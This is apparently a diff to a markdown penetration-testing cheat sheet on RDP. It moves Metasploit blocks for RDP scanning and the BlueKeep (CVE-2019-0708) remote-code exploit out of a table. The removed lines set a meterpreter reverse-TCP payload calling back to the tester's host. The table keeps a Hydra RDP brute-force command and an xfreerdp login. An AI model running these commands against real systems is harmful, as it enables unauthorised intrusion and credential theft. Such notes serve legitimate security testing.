@@ -205,33 +205,13 @@ set SMBPass <password>
 exploit
 ```
 
----
-
 | Task / Step                            | Command |
 | ------------------------------------- | ------- |
 | **Brute‑force RDP login with Hydra**  | `hydra -L /path/to/userlist.txt -P /path/to/passwordlist.txt rdp://[TARGET] -s [PORT]` |
-| **Use RDP Scanner (check RDP enabled)** | ```bash
-use auxiliary/scanner/rdp/rdp_scanner
-set RHOSTS [TARGET]
-run
-``` |
-| **Scan for BlueKeep (CVE‑2019‑0708)** | ```bash
-use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
-set RHOSTS [TARGET]
-run
-``` |
-| **Exploit BlueKeep (RCE)** *(optional)* | ```bash
-use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
-set RHOSTS [TARGET]
-set RPORT 3389
-set TARGET 1
-set PAYLOAD windows/x64/meterpreter/reverse_tcp
-set LHOST [YOUR-IP]
-set LPORT 4444
-exploit
-``` |
+| **Use RDP Scanner (check RDP enabled)** | See code block below |
+| **Scan for BlueKeep (CVE‑2019‑0708)** | See code block below |
+| **Exploit BlueKeep (RCE) (optional)** | See code block below |
 | **Connect using xfreerdp**            | `xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[TARGET]:[PORT]` |
-
 ---
 
 ### Directory Discovery with Gobuster
